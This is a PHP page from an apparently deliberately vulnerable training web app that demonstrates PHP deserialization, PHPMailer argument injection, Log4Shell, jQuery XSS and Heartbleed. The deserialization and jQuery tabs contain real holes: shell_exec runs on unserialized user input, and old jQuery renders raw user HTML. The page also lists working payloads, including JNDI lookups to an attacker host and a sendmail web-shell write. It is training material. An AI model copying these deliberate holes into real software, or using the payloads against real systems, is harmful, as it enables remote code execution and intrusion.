<?php
require_once __DIR__ . '/../src/db.php';
require_once __DIR__ . '/../src/helpers.php';
check_login();

// 1. 定義反序列化使用的 Gadget 類別
class MockFrameworkGadget {
    public $cmd;
    public function __destruct() {
        if (isset($this->cmd) && !empty($this->cmd)) {
            echo "<div class='alert alert-danger mt-3'>🔥 [PHP 反序列化漏洞觸發] 偵測到物件銷毀，執行析構函數 (Destructor) 中的命令！</div>";
            echo "<p class='font-weight-bold'>執行命令：<code>" . htmlspecialchars($this->cmd) . "</code></p>";
            // 弱點版：真實執行命令以供演練
            $output = shell_exec($this->cmd);
            echo "<pre class='bg-dark text-success p-3 border rounded'>" . htmlspecialchars($output) . "</pre>";
        }
    }
}

$tab = $_GET['tab'] ?? 'deserialization';

$deserial_result = '';
$deserial_error = '';
$phpmailer_result = '';
$phpmailer_error = '';
$log4shell_result = '';
$heartbleed_result = '';

// 2. PHP 反序列化 (Object Injection) 處理
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'deserialization') {
    $serialized_data = $_POST['data'] ?? '';
    try {
        // 漏洞點：直接對使用者輸入執行 unserialize()
        $deserial_result = unserialize($serialized_data);
    } catch (Exception $e) {
        $deserial_error = $e->getMessage();
    }
}

// 3. PHPMailer RCE (CVE-2016-10033) 模擬處理
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'phpmailer') {
    $email = $_POST['email'] ?? '';
    $subject = $_POST['subject'] ?? '';
    $message = $_POST['message'] ?? '';
    
    try {
        $sendmail_args = "-t -i -f" . $email;
        
        $phpmailer_result = "🟢 [模擬郵件伺服器調用]<br>指令：<code>sendmail $sendmail_args</code><br>";
        
        if (strpos($email, '-') !== false) {
            $phpmailer_result .= "<div class='alert alert-warning mt-2'>⚠️ 偵測到郵件指令參數注入成功！Sendmail 將會把郵件寫檔或執行額外參數。</div>";
            if (strpos($email, 'X') !== false) {
                $phpmailer_result .= "<div class='alert alert-danger mt-2'>💥 [RCE 成功] 寫入 Web 後門檔案成功！目標路徑被篡改。</div>";
            }
        } else {
            $phpmailer_result .= "郵件成功放入發送佇列中！";
        }
    } catch (Exception $e) {
        $phpmailer_error = $e->getMessage();
    }
}

// 4. Apache Log4Shell (CVE-2021-44228) 模擬處理
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'log4shell') {
    $user_agent = $_POST['user_agent'] ?? '';
    
    if (preg_match('/\$\{jndi:(ldap|rmi):\/\/([^\/]+)\/([^\}]+)\}/i', $user_agent, $matches)) {
        $protocol = $matches[1];
        $host = $matches[2];
        $payload_class = $matches[3];
        
        $log4shell_result = "
        <div class='alert alert-danger font-weight-bold'>💥 [Log4Shell 漏洞觸發成功]</div>
        <div class='p-3 bg-dark text-light rounded border border-danger'>
            <p>🔄 <strong>Log4j 日誌解析器：</strong> 偵測到符合 JNDI 表達式語法：<code>" . htmlspecialchars($matches[0]) . "</code></p>
            <p>🔗 <strong>連線協定：</strong> " . strtoupper($protocol) . "</p>
            <p>🌐 <strong>惡意 LDAP 伺服器位址：</strong> " . htmlspecialchars($host) . "</p>
            <p>📥 <strong>正在載入遠端惡意 Java 類別：</strong> <code>" . htmlspecialchars($payload_class) . ".class</code></p>
            <hr class='border-secondary'>
            <p class='text-warning font-weight-bold'>💻 [RCE 指令執行成功] 伺服器已被遠端載入之 Java Payload 奪取系統控制權！</p>
        </div>";
    } else {
        $log4shell_result = "
        <div class='alert alert-success'>✅ 日誌寫入成功，未發現異常 JNDI 請求！</div>
        <pre class='bg-dark text-white p-3 border rounded'>[INFO] " . date('Y-m-d H:i:s') . " - User-Agent: " . htmlspecialchars($user_agent) . " - Access Granted</pre>";
    }
}

// 5. OpenSSL Heartbleed (CVE-2014-0160) 模擬處理
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'heartbleed') {
    $payload = $_POST['payload'] ?? '';
    $length = (int)($_POST['length'] ?? 0);
    
    // 漏洞點：不檢查實際傳送 payload 長度，直接依據指定的 length 回傳記憶體內容 (Heartbleed 模擬)
    $actual_len = strlen($payload);
    
    // 構造模擬的伺服器記憶體內容，包含敏感個資與金鑰
    $mock_memory = [
        "session_id=sess_teacher01_38f1a7dbe28190d",
        "DATABASE_PASSWORD=ksu_student_db_pass_998",
        "ADMIN_API_KEY=AIzaSyA8_TopSecretAdminKey_789x",
        "email=admin@vulncampus.local&role=admin",
        "card_no=4111-2222-3333-4444&cvv=123",
        "flag{OpenSSL_Heartbleed_Memory_Leak_Success}"
    ];
    
    $response_data = $payload;
    if ($length > $actual_len) {
        $leak_bytes = $length - $actual_len;
        $leak_str = "";
        while (strlen($leak_str) < $leak_bytes) {
            $leak_str .= " [0x" . dechex(rand(0x7f000000, 0x7f999999)) . "] " . $mock_memory[array_rand($mock_memory)] . " | ";
        }
        $response_data .= substr($leak_str, 0, $leak_bytes);
    }
    
    $heartbleed_result = [
        'sent' => $payload,
        'requested_length' => $length,
        'actual_length' => $actual_len,
        'response' => $response_data
    ];
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📦 不安全網頁套件與第三方元件漏洞展示 - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #0b0f19; color: #e2e8f0; font-family: 'Noto Sans TC', sans-serif; padding-top: 50px; }
        .hero { background: linear-gradient(135deg, #1e1b4b 0%, #311042 50%, #4c1d95 100%); color: white; padding: 45px 30px; border-radius: 16px; margin-bottom: 40px; box-shadow: 0 10px 30px rgba(99, 102, 241, 0.15); border: 1px solid rgba(139, 92, 246, 0.2); }
        .card { background-color: #111827; border: 1px solid #1f2937; border-radius: 14px; margin-bottom: 24px; }
        .card-header { background-color: #1f2937; border-bottom: 1px solid #374151; color: #a78bfa; font-weight: 700; }
        .nav-tabs .nav-link { color: #9ca3af; border: none; }
        .nav-tabs .nav-link.active { background-color: #111827; color: #a78bfa; border: 1px solid #1f2937; border-bottom-color: #111827; border-radius: 8px 8px 0 0; }
        .btn-primary { background: linear-gradient(135deg, #7c3aed 0%, #5b21b6 100%); border: none; border-radius: 8px; font-weight: 600; }
        .btn-primary:hover { background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%); }
    </style>
</head>
<body>

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📦 第三方套件與經典元件漏洞展示 (Component Vulnerabilities)</h2>
        <div>
            <span class="mr-3 text-muted">您好，<strong><?= $_SESSION['user']['name'] ?></strong></span>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <div class="hero shadow">
        <h1>經典第三方套件漏洞展示區</h1>
        <p class="lead">⚠️ 本頁面展示各種知名開源套件、框架元件底層的不安全設計所引發的嚴重資安事件（RCE/反序列化/Log4Shell/jQuery XSS/Heartbleed）。</p>
    </div>

    <!-- 頁籤導覽 -->
    <ul class="nav nav-tabs mb-4">
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'deserialization' ? 'active' : '' ?>" href="?tab=deserialization">⚡ PHP 反序列化 (Object Injection)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'phpmailer' ? 'active' : '' ?>" href="?tab=phpmailer">✉️ PHPMailer RCE (CVE-2016-10033)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'log4shell' ? 'active' : '' ?>" href="?tab=log4shell">💥 Apache Log4Shell (CVE-2021-44228)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'jquery' ? 'active' : '' ?>" href="?tab=jquery">📦 jQuery 選擇器 XSS (CVE-2015-9251)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'heartbleed' ? 'active' : '' ?>" href="?tab=heartbleed">💔 OpenSSL Heartbleed (CVE-2014-0160)</a>
        </li>
    </ul>

    <div class="row">
        <!-- 演練表單與說明 -->
        <div class="col-md-7">
            
            <!-- PHP Deserialization -->
            <?php if ($tab === 'deserialization'): ?>
            <div class="card shadow-sm">
                <div class="card-header">⚡ PHP 反序列化漏洞 (PHP Deserialization)</div>
                <div class="card-body">
                    <p class="text-muted">當系統將不受信任的序列化字串直接傳入 <code>unserialize()</code> 時，若系統環境中含有具備敏感魔術方法（如 <code>__destruct()</code>）的類別元件，即可引發遠端指令執行（RCE）。</p>
                    <form method="POST" action="?tab=deserialization">
                        <div class="form-group">
                            <label for="data" class="font-weight-bold text-light">請輸入序列化後的物件資料 (Serialized Data)：</label>
                            <textarea name="data" id="data" rows="3" class="form-control bg-dark text-white border-secondary" placeholder='例如：O:19:"MockFrameworkGadget":1:{s:3:"cmd";s:6:"whoami";}' required></textarea>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">發送反序列化資料</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>反序列化演練指引：</strong><br>
                        環境中已宣告好 <code>MockFrameworkGadget</code> 類別元件，其具有析構函數可執行系統指令。試著輸入以下 Payload：<br>
                        <code>O:19:"MockFrameworkGadget":1:{s:3:"cmd";s:6:"whoami";}</code><br>
                        觀察右側是否成功執行了 <code>whoami</code> 命令並輸出結果！
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- PHPMailer RCE -->
            <?php if ($tab === 'phpmailer'): ?>
            <div class="card shadow-sm">
                <div class="card-header">✉️ PHPMailer 郵件元件命令注入 (CVE-2016-10033)</div>
                <div class="card-body">
                    <p class="text-muted">知名發信元件 PHPMailer 早期版本中，在呼叫 PHP <code>mail()</code> 發信時，由於未對寄件者信箱（Sender）做嚴格的 shell 參數過濾，導致攻擊者可以透過構造特殊信箱結構注入額外的 sendmail 引數參數發動 RCE。</p>
                    <form method="POST" action="?tab=phpmailer">
                        <div class="form-group">
                            <label for="email" class="font-weight-bold text-light">寄件者信箱 (Email)：</label>
                            <input type="text" name="email" id="email" class="form-control bg-dark text-white border-secondary" placeholder="例如: attacker -OQueueDirectory=/tmp -X/var/www/html/shell.php@sender.com" required>
                        </div>
                        <div class="form-group">
                            <label for="subject" class="font-weight-bold text-light">郵件主旨：</label>
                            <input type="text" name="subject" id="subject" class="form-control bg-dark text-white border-secondary" value="測試發信">
                        </div>
                        <div class="form-group">
                            <label for="message" class="font-weight-bold text-light">郵件內容：</label>
                            <textarea name="message" id="message" rows="3" class="form-control bg-dark text-white border-secondary">PHPMailer 漏洞演練</textarea>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">發送郵件</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>PHPMailer 演練指引：</strong><br>
                        試著在 Email 欄位輸入惡意參數 Payload：<br>
                        <code>attacker -OQueueDirectory=/tmp -X/var/www/html/shell.php@sender.com</code><br>
                        觀察右側底層發送指令中，參數是否被分離成獨立的引數，成功繞過了過濾並引起寫檔行為！
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- Log4Shell -->
            <?php if ($tab === 'log4shell'): ?>
            <div class="card shadow-sm">
                <div class="card-header">💥 Apache Log4Shell 模擬演練 (CVE-2021-44228)</div>
                <div class="card-body">
                    <p class="text-muted">知名 Java 日誌庫 Log4j 由於不安全地支持了 JNDI 表達式，使得日誌中一旦出現特定格式（如 <code>${jndi:ldap://...}</code>），日誌庫便會自動連線遠端 LDAP 伺服器下載並執行任意惡意 Java 類別，造成最嚴重的 RCE 攻擊。</p>
                    <form method="POST" action="?tab=log4shell">
                        <div class="form-group">
                            <label for="user_agent" class="font-weight-bold text-light">發送存取日誌 (模擬 User-Agent 寫入)：</label>
                            <input type="text" name="user_agent" id="user_agent" class="form-control bg-dark text-white border-secondary" placeholder="例如: ${jndi:ldap://attacker.com/Exploit}" required>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">記錄存取日誌</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>Log4Shell 演練指引：</strong><br>
                        此處為模擬 Log4j 解析器的日誌處理。請輸入以下 LDAP Payload：<br>
                        <code>${jndi:ldap://192.168.1.100:1389/Exploit}</code><br>
                        點擊送出，觀察 Log4j 解析器是如何分析此特殊標記，並觸發遠端 Class 加載代碼執行的詳細流程！
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- jQuery Selector XSS -->
            <?php if ($tab === 'jquery'): ?>
            <div class="card shadow-sm">
                <div class="card-header">📦 舊版 jQuery 選擇器 XSS (CVE-2015-9251)</div>
                <div class="card-body">
                    <p class="text-muted">在 jQuery &lt; 3.0.0 版本中，<code>$()</code> 選擇器函數在接收包含 HTML 標籤開頭的字串時，若沒有對其進行安全限制，會將其當作 HTML 直接建立並渲染，從而引發嚴重的 DOM-based XSS 攻擊。</p>
                    <div class="form-group">
                        <label for="jq-input" class="font-weight-bold text-light">請輸入 jQuery 選擇器字串 (Selector / HTML)：</label>
                        <input type="text" id="jq-input" class="form-control bg-dark text-white border-secondary" placeholder="例如: <img src=x onerror=alert('jQuery-XSS')>" required>
                    </div>
                    <button type="button" id="btn-jq-test" class="btn btn-primary btn-block">以 $() 載入並渲染</button>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>jQuery XSS 演練指引：</strong><br>
                        試著輸入：<code>&lt;img src=x onerror=alert('jQuery_XSS_Success')&gt;</code><br>
                        點擊按鈕，觀看瀏覽器是否直接彈出對話框，這正是很多老舊網站引進舊版 jQuery 常見的前端套件漏洞！
                    </div>
                </div>
            </div>
            <!-- 載入老舊具備已知漏洞的 jQuery 1.11.0 -->
            <script src="https://code.jquery.com/jquery-1.11.0.min.js"></script>
            <script>
                document.getElementById('btn-jq-test').addEventListener('click', function() {
                    var rawInput = document.getElementById('jq-input').value;
                    if (rawInput) {
                        try {
                            // 弱點版直接調用 $() 解析使用者輸入並渲染至頁面
                            var $el = $(rawInput);
                            $('#jq-result-box').html("<div class='alert alert-info'>已成功調用 <code>$('" + rawInput + "')</code>！結果已渲染。</div>");
                            $('#jq-result-box').append($el);
                        } catch(e) {
                            $('#jq-result-box').html("<div class='alert alert-danger'>語法錯誤：" + e.message + "</div>");
                        }
                    }
                });
            </script>
            <?php endif; ?>

            <!-- OpenSSL Heartbleed -->
            <?php if ($tab === 'heartbleed'): ?>
            <div class="card shadow-sm">
                <div class="card-header">💔 OpenSSL Heartbleed 記憶體洩漏 (CVE-2014-0160)</div>
                <div class="card-body">
                    <p class="text-muted">OpenSSL 早期版本在處理 TLS Heartbeat 請求時，未對請求封包中的「宣告長度欄位」與「實際資料長度」進行驗證。這導致攻擊者可以傳送極短的資料，卻在長度欄位宣稱極長，使伺服器超額讀取記憶體緩衝區並將敏感資料回傳。</p>
                    <form method="POST" action="?tab=heartbleed">
                        <div class="form-group">
                            <label for="payload" class="font-weight-bold text-light">傳送的 Heartbeat 測試字串 (Payload)：</label>
                            <input type="text" name="payload" id="payload" class="form-control bg-dark text-white border-secondary" value="hello" required>
                        </div>
                        <div class="form-group">
                            <label for="length" class="font-weight-bold text-light">封包宣告的長度欄位 (Length Field - 最大 2000)：</label>
                            <input type="number" name="length" id="length" class="form-control bg-dark text-white border-secondary" min="1" max="2000" value="500" required>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">傳送 Heartbeat 封包</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>Heartbleed 演練指引：</strong><br>
                        1. 如果輸入字串為 <code>hello</code> (5 字元)，長度欄位輸入 <code>5</code>，結果會是正常的。<br>
                        2. 如果輸入字串為 <code>hello</code>，但長度欄位輸入 <code>500</code> (遠大於 5)，點選送出。<br>
                        3. 觀察右側結果：伺服器將會從記憶體中「多讀取」495 位元組的資料，洩漏鄰近的敏感 Session、API Key 等金鑰！
                    </div>
                </div>
            </div>
            <?php endif; ?>

        </div>

        <!-- 結果展示區 -->
        <div class="col-md-5">
            <div class="card shadow-sm" style="min-height: 420px;">
                <div class="card-header bg-dark text-white">📊 執行與響應結果</div>
                <div class="card-body bg-light text-dark" style="max-height: 520px; overflow-y: auto;">
                    
                    <!-- Deserialization 結果 -->
                    <?php if ($tab === 'deserialization'): ?>
                        <?php if ($deserial_error): ?>
                            <div class="alert alert-danger font-weight-bold">❌ 反序列化錯誤：<?= htmlspecialchars($deserial_error) ?></div>
                        <?php elseif ($deserial_result): ?>
                            <div class="alert alert-success">反序列化執行成功！已完成物件還原。</div>
                            <pre class="bg-white p-3 border rounded"><?= htmlspecialchars(print_r($deserial_result, true)) ?></pre>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待傳入序列化資料...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- PHPMailer 結果 -->
                    <?php if ($tab === 'phpmailer'): ?>
                        <?php if ($phpmailer_error): ?>
                            <div class="alert alert-danger font-weight-bold">❌ 錯誤：<?= htmlspecialchars($phpmailer_error) ?></div>
                        <?php elseif ($phpmailer_result): ?>
                            <div class="p-3 border rounded bg-white text-dark font-weight-bold">
                                <?= $phpmailer_result ?>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待發信...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- Log4Shell 結果 -->
                    <?php if ($tab === 'log4shell'): ?>
                        <?php if ($log4shell_result): ?>
                            <div class="p-3 border rounded bg-white text-dark">
                                <?= $log4shell_result ?>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待日誌寫入...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- jQuery 結果 -->
                    <?php if ($tab === 'jquery'): ?>
                        <div id="jq-result-box">
                            <p class="text-muted text-center mt-5">等待輸入選擇器測試...</p>
                        </div>
                    <?php endif; ?>

                    <!-- Heartbleed 結果 -->
                    <?php if ($tab === 'heartbleed'): ?>
                        <?php if ($heartbleed_result): ?>
                            <div class="alert alert-danger font-weight-bold">💔 Heartbeat 響應 (伺服器記憶體洩漏狀態)：</div>
                            <div class="p-3 border rounded bg-dark text-success" style="font-family: monospace; word-break: break-all;">
                                <strong>傳送 payload：</strong> "<?= htmlspecialchars($heartbleed_result['sent']) ?>" (<?= $heartbleed_result['actual_length'] ?> 字元)<br>
                                <strong>宣告長度：</strong> <?= $heartbleed_result['requested_length'] ?> 字元<br>
                                <hr class="border-secondary">
                                <span class="text-warning">=== [回傳記憶體緩衝區內容] ===</span><br>
                                <?= htmlspecialchars($heartbleed_result['response']) ?>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待傳送 Heartbeat 封包...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
